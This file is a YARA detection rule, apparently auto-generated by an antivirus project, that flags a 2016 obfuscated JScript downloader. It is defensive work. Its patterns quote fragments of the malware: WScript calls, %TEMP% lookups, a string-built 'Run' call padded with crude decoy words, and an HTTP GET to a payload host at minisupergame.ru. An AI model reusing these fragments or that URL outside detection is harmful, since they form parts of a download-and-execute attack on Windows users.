rule sig_20160428_1d9690fbe2afb8bb2e562a6e1d9349aa {
  meta:
    description = "datamaliciousorder - file 20160428_1d9690fbe2afb8bb2e562a6e1d9349aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4e792267c26678bc5cd7008a54762010405d3ff9b88c422a033ea697f1ae8332"

  strings:
    $s1  = "function XymNgvUnmXpoRxnMvdOml(InbBqyDpmUsxMceRyuBwi){XwwAorOeqGvuFrmUclUsj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function KatGmrOmjGciBlmFarBeg() {return XwwAorOeqGvuFrmUclUsj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function XymNgvUnmXpoRxnMvdOml(InbBqyDpmUsxMceRyuBwi){XwwAorOeqGvuFrmUclUsj[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function QgsPkkMzkWysStyFirGtt(PkqNumIoaFfvAtfYzvEbb, AroZjaLsbLthCupXznSfx){QvdOekEnpVjzVawBvlAnf = QvdOekEnpVjzVawBvlAnf * 1; " ascii
    $s5  = "var XwwAorOeqGvuFrmUclUsj = function XabSzbOxdFweBjxKqaJvn() {return QbyTiwHqsZslEcqYaoDdy[MhpAzuBmhUwdNgpYfrYls](\"WScript\"+\"" ascii
    $s6  = "return PkqNumIoaFfvAtfYzvEbb - AroZjaLsbLthCupXznSfx;};" fullword ascii
    $s7  = "QpvGsqWvbZkhTvdKzlYyy[PqlOzgJesNyaOfhGmaHgq](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s8  = "var XwwAorOeqGvuFrmUclUsj = function XabSzbOxdFweBjxKqaJvn() {return QbyTiwHqsZslEcqYaoDdy[MhpAzuBmhUwdNgpYfrYls](\"WScript\"+\"" ascii
    $s9  = "var QbyTiwHqsZslEcqYaoDdy = this[\"WScript\"];" fullword ascii
    $s10 = "function KatGmrOmjGciBlmFarBeg() {return XwwAorOeqGvuFrmUclUsj[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (QpvGsqWvbZkhTvdKzlYyy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function QgsPkkMzkWysStyFirGtt(PkqNumIoaFfvAtfYzvEbb, AroZjaLsbLthCupXznSfx){QvdOekEnpVjzVawBvlAnf = QvdOekEnpVjzVawBvlAnf * 1; " ascii
    $s13 = "function GgwDhsFuiKrqLrpYjoJyt(){return WhyQmjWpeLtlSzmNreSwj + \"\";};" fullword ascii
    $s14 = "function BjgImzEpgWboVffNojUst() {return ((XpaFpzZbgTfhAmjMtlKzc == true) && (XpaFpzZbgTfhAmjMtlKzc == XgxDmxNtjAfdAdiTinHev)) ?" ascii
    $s15 = "function BjgImzEpgWboVffNojUst() {return ((XpaFpzZbgTfhAmjMtlKzc == true) && (XpaFpzZbgTfhAmjMtlKzc == XgxDmxNtjAfdAdiTinHev)) ?" ascii
    $s16 = "function CgzDpuXunCpxLasZqbIne(){return 23;};" fullword ascii
    $s17 = "}while (OjaQmvUaoOqrQwuYamDxs);" fullword ascii
    $s18 = "function OrfNovYwhAlqOsjCojLws(){return MhpAzuBmhUwdNgpYfrYls;};" fullword ascii
    $s19 = "var KksOdaOqwYyrEqiSlrMbp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "XpaFpzZbgTfhAmjMtlKzc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}